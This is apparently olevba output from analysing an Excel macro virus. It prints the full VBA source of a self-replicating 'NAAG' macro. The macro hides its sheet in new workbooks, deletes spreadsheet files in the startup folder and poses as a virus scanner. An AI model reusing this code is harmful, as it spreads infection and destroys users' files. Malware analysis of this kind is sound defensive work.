olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-075817f83789fa4e7ad50907f26d97aa91777efd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NAAG.bas 
in file: Virus.MSExcel.Laroux-based-075817f83789fa4e7ad50907f26d97aa91777efd - OLE stream: '_VBA_PROJECT_CUR/VBA/NAAG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "NAAG.XLS")
    If m$ = "NAAG.XLS" Then p = 1 Else p = 0
    On Error Resume Next
    If FileLen(c$ & "\" & "NAAG.XLS") = 0 Then
       p = 0
       Kill (c$ & "\" & "NAAG.XLS")
    End If
    On Error GoTo 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("NAAG").Visible = True
    Sheets("NAAG").Select
    Sheets("NAAG").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "NAAG.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    SetAttr Application.StartupPath & "/" & "NAAG.XLS", vbReadOnly + vbArchive
    ChDir c4$
    Workbooks(n4$).Sheets("NAAG").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NAAG.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "NAAG" Then
        Workbooks("NAAG.XLS").Sheets("NAAG").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("NAAG").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NAAG.XLS!check_files"
    Case Else
End Select
    
    ctr% = 0
    m$ = Dir(c$ & "\*.xls")
    Virus$ = ""
    While m$ <> ""
       If m$ <> "NAAG.XLS" Then
          If FileLen(c$ & "\" & m$) <> 0 Then
             Virus$ = Virus$ & Chr(9) & Mid(m$, 1, Len(m$) - 4) & Chr(13)
             On Error Resume Next
             Kill (c$ & "\" & m$)
             On Error GoTo 0
          End If
       End If
       If m$ <> "" Then ctr% = ctr% + 1
       m$ = Dir
    Wend
        
    m$ = Dir("C:\WINDOWS\SYSTEM\EXPLORE.EXE")
    If m$ <> "" Then
       Virus$ = Virus$ & Chr(9) & "ExploreZip (WORM)" & Chr(13)
       On Error Resume Next
          Kill ("C:\WINDOWS\SYSTEM\EXPLORE.EXE")
       On Error GoTo 0
    End If
    If Len(Trim(Virus$)) <> 0 Then
       Application.DisplayStatusBar = True
       Application.StatusBar = "Jhun"
       x$ = MsgBox("ATTENTION: " & Application.UserName & Chr(13) & Chr(13) & _
       "NAAG FOUND THE FOLLOWING VIRUS(es)" & Chr(13) & _
       Virus$ & Chr(13) & _
       "Run your virus cleaner to remove the virus!" & Chr(13) & Chr(13) & _
       "N.B. This program checks for the worm ExploreZip" & Chr(13) & _
       "      and the macro viruses Laroux, SGV, Bayantel, and PLDT" & _
       Chr(13) & Chr(13) & Chr(9) & Chr(9) & "            KJXR", _
       vbOKOnly, "NAAG Virus Scanner v1.0")
       Application.DisplayStatusBar = False
    End If
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  NAA
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |EXPLORE.EXE         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

